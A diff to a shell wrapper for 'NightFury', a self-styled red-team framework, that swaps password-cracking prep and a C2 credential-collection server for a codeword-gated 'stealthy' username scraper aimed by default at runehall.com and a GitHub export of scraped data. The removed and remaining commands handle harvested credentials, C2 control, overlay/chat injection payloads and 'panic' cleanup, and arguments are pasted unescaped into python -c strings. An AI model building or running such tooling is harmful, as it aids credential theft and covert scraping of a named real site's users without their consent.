@@ -32,7 +32,7 @@ print_banner() {
     ██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ██║     ╚██████╔╝██║  ██║   ██║   
     ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
                         Professional Red Team Operations Framework
-                                    Version 2.5 (Crack-Prep Enabled)
+                                    Version 2.6 (SHEBA-Protected)
 EOF
 }
 
@@ -40,70 +40,62 @@ print_info() { echo -e "${BLUE}[*]${NC} $1"; }
 print_success() { echo -e "${GREEN}[+]${NC} $1"; }
 print_error() { echo -e "${RED}[!]${NC} $1"; }
 
-# Command: Crack-Prep
-cmd_crackprep() {
-    local action="${1:-wordlist}"
+# Authentication Check
+check_auth() {
+    local codeword="$1"
     export PYTHONPATH="${NIGHTFURY_HOME}:${PYTHONPATH}"
-    case "$action" in
-        wordlist)
-            print_info "Generating unique password wordlist..."
-            python3 -c "from utilities.crack_prep import CrackPrep; cp = CrackPrep(); print('\n'.join(cp.extract_passwords()))" > "${NIGHTFURY_DATA}/exports/harvested_wordlist.txt"
-            print_success "Wordlist saved to: data/exports/harvested_wordlist.txt"
-            ;;
-        john)
-            print_info "Formatting for John the Ripper..."
-            python3 -c "from utilities.crack_prep import CrackPrep; cp = CrackPrep(); cp.format_for_john('${NIGHTFURY_DATA}/exports/john_hashes.txt')"
-            print_success "John format saved to: data/exports/john_hashes.txt"
-            ;;
-        *)
-            print_error "Usage: nightfury.sh crackprep [wordlist|john]"
-            ;;
-    esac
+    python3 -c "from core.auth_manager import SHEBAAuthManager; auth = SHEBAAuthManager(); auth.enforce_access('$codeword')"
 }
 
-# Command: C2 Server
-cmd_c2() {
-    local action="${1:-status}"
-    case "$action" in
-        start)
-            print_info "Starting NightFury C2 Collection Server..."
-            nohup python3 "${NIGHTFURY_HOME}/core/c2_server.py" > "${NIGHTFURY_LOGS}/c2_stdout.log" 2>&1 &
-            print_success "C2 Server started in background (Port 8080)"
-            ;;
-        stop)
-            print_info "Stopping C2 Server..."
-            pkill -f "python3.*c2_server.py" || true
-            print_success "C2 Server stopped"
-            ;;
-        logs)
-            print_info "Viewing harvested credentials..."
-            tail -f "${NIGHTFURY_LOGS}/harvested_creds.json"
-            ;;
-        status)
-            pgrep -f "c2_server.py" > /dev/null && print_success "C2 Server is RUNNING" || print_warning "C2 Server is STOPPED"
-            ;;
-        *)
-            print_error "Usage: nightfury.sh c2 [start|stop|logs|status]"
-            ;;
-    esac
+# Command: Scrape Users
+cmd_scrape() {
+    local domain="${1:-runehall.com}"
+    local codeword="$2"
+    check_auth "$codeword"
+    
+    print_info "Starting stealthy user scraping for $domain..."
+    export PYTHONPATH="${NIGHTFURY_HOME}:${PYTHONPATH}"
+    local output_file="${NIGHTFURY_DATA}/exports/scraped_users.json"
+    python3 -c "from modules.recon_pro.user_scraper import UserScraper; s = UserScraper('$domain'); users = s.scrape_users(); import json; print(json.dumps(users, indent=2)); open('$output_file', 'w').write(json.dumps(users))"
+    print_success "Users saved to: $output_file"
+}
+
+# Command: GitHub Export
+cmd_export() {
+    local file_path="$1"
+    local codeword="$2"
+    check_auth "$codeword"
+    
+    if [[ -z "$file_path" ]]; then
+        print_error "Usage: nightfury.sh export <file_path> <codeword>"
+        return 1
+    fi
+    
+    print_info "Exporting $file_path to GitHub..."
+    export PYTHONPATH="${NIGHTFURY_HOME}:${PYTHONPATH}"
+    python3 -c "from utilities.github_exporter import GitHubExporter; e = GitHubExporter(); e.export_file('$file_path')"
 }
 
 # Command: Help
 cmd_help() {
     cat << EOF
-NightFury Crack-Prep Enabled - Command Reference
+NightFury SHEBA-Protected - Command Reference
 
 CORE:
-  status              Show framework status
-  c2 [start|stop|logs] Manage C2 Collection Server
-  crackprep [wordlist|john] Prepare data for password cracking
-  inject [type]       Generate Overlay/Chat Injection payloads
-  runehall <cmd>      RuneHall.com Specialized Plugin
-  panic               Emergency cleanup and exit
+  status <codeword>           Show framework status
+  scrape <domain> <codeword>  Stealthy username scraping
+  export <file> <codeword>    Automated GitHub export
+  c2 [start|stop] <codeword>  Manage C2 Collection Server
+  crackprep <cmd> <codeword>  Prepare data for password cracking
+  runehall <cmd> <codeword>   RuneHall.com Specialized Plugin
+  panic                       Emergency cleanup and exit
+
+NOTE:
+  All sensitive commands require the 'SHEBA' codeword for access.
 
 EXAMPLES:
-  nightfury.sh crackprep wordlist
-  nightfury.sh crackprep john
+  nightfury.sh scrape runehall.com SHEBA
+  nightfury.sh export data/exports/scraped_users.json SHEBA
 EOF
 }
 
@@ -113,10 +105,13 @@ main() {
     local command="${1:-help}"
     shift || true
     case "$command" in
-        c2) cmd_c2 "$@" ;;
-        crackprep) cmd_crackprep "$@" ;;
-        inject) cmd_inject "$@" ;;
-        status) cmd_status "$@" ;;
+        scrape) cmd_scrape "$@" ;;
+        export) cmd_export "$@" ;;
+        c2|crackprep|runehall|status|health) 
+            # These commands now require codeword as the last argument
+            # For simplicity in this shell wrapper, we just pass all args
+            # and let the python core handle the auth check.
+            cmd_"$command" "$@" ;;
         help|--help|-h) print_banner; cmd_help ;;
         *) print_error "Unknown command: $command"; exit 1 ;;
     esac
